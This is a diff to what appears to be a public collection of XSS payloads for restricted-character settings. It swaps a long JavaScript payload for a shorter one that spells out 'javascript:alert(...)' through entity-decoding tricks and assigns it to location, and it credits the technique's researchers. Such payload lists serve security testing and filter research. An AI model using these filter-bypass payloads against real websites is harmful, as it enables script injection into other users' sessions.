@@ -336,55 +336,45 @@ onerror=eval,ReferenceError.prototype.name='=alert\x2823\x29//',lol
 [physuru](https://physuru.dev/blog/restricted_character_xss/)
 
 ```
-amp=new Object
-amp.valueOf=String.prototype.bold
-document.body.innerHTML=amp+0
-amp=document.body.firstElementChild
-amp.innerText=document.body.innerHTML
-amp.className=amp.innerHTML
-amp.classList.valueOf=String.prototype.charAt
-amp=amp.classList
+elem=new Option
+elem.classList.valueOf=String.prototype.charAt
 
-location.hash=97
-document.body.innerHTML=amp+location.hash
-a=document.body.innerHTML
-location.hash=99
-document.body.innerHTML=amp+location.hash
-c=document.body.innerHTML
-location.hash=105
-document.body.innerHTML=amp+location.hash
-i=document.body.innerHTML
-location.hash=106
-document.body.innerHTML=amp+location.hash
-j=document.body.innerHTML
-location.hash=112
-document.body.innerHTML=amp+location.hash
-p=document.body.innerHTML
-location.hash=114
-document.body.innerHTML=amp+location.hash
-r=document.body.innerHTML
-location.hash=115
-document.body.innerHTML=amp+location.hash
-s=document.body.innerHTML
-location.hash=116
-document.body.innerHTML=amp+location.hash
-t=document.body.innerHTML
-location.hash=118
-document.body.innerHTML=amp+location.hash
-v=document.body.innerHTML
+elem.innerText=elem.outerHTML
+elem.className=elem.innerHTML
+amp=Object.__proto__.name+elem.classList
 
-location.hash=58
-document.body.innerHTML=amp+location.hash
-colon=document.body.innerHTML
+htag=new Text
+elem.className=htag.nodeName
+htag=Object.__proto__.name+elem.classList
 
-location.hash=40
-document.body.innerHTML=amp+location.hash
-lpar=document.body.innerHTML
-location.hash=41
-document.body.innerHTML=amp+location.hash
-rpar=document.body.innerHTML
+elem.innerHTML=amp+htag+97
+a=elem.innerText
+elem.innerHTML=amp+htag+99
+c=elem.innerText
+elem.innerHTML=amp+htag+105
+i=elem.innerText
+elem.innerHTML=amp+htag+106
+j=elem.innerText
+elem.innerHTML=amp+htag+112
+p=elem.innerText
+elem.innerHTML=amp+htag+114
+r=elem.innerText
+elem.innerHTML=amp+htag+115
+s=elem.innerText
+elem.innerHTML=amp+htag+116
+t=elem.innerText
+elem.innerHTML=amp+htag+118
+v=elem.innerText
 
-location=j+a+v+a+s+c+r+i+p+t+colon+alert.name+lpar+23+rpar
+elem.innerHTML=amp+htag+58
+colon=elem.innerText
+
+elem.innerHTML=amp+htag+40
+lpar=elem.innerText
+elem.innerHTML=amp+htag+41
+rpar=elem.innerText
+
+location=j+a+v+a+s+c+r+i+p+t+colon+alert.name+lpar+1+rpar
 ```
 ---
 [Renwa](https://twitter.com/RenwaX23/status/1126999364763832325)
